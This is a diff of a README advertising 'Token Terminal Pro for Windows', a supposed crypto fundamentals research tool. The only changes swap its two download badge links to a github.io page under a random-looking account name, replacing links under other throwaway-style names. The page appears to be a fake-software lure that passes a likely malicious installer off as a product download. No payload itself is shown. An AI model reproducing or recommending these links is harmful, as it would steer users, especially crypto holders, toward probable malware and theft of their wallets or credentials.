@@ -4,7 +4,7 @@
 
 ## 📥 Download Token Terminal Pro for Windows
 
-[![⬇️ Download Token Terminal Pro](https://img.shields.io/badge/Download-Token%20Terminal%20Pro-blue?style=for-the-badge&logo=windows)](https://rodionoffkarim.github.io/.github/token-terminal)
+[![⬇️ Download Token Terminal Pro](https://img.shields.io/badge/Download-Token%20Terminal%20Pro-blue?style=for-the-badge&logo=windows)](https://alfonsobentleyeipl.github.io/.github/token-terminal)
 
 ---
 
@@ -30,7 +30,7 @@ Unlike basic crypto price trackers, Token Terminal Pro focuses on the **fundamen
 
 Whether you are researching DeFi protocols, NFT marketplaces, blockchain infrastructure, or emerging Layer-2 networks, Token Terminal Pro delivers the transparency, structure, and depth you need to make well-informed investment decisions.
 
-[![⬇️ Download Token Terminal Pro](https://img.shields.io/badge/Download-Token%20Terminal%20Pro-blue?style=for-the-badge&logo=windows)](https://terminalload.github.io/.github/)
+[![⬇️ Download Token Terminal Pro](https://img.shields.io/badge/Download-Token%20Terminal%20Pro-blue?style=for-the-badge&logo=windows)](https://alfonsobentleyeipl.github.io/.github/token-terminal)
 
 ---
 
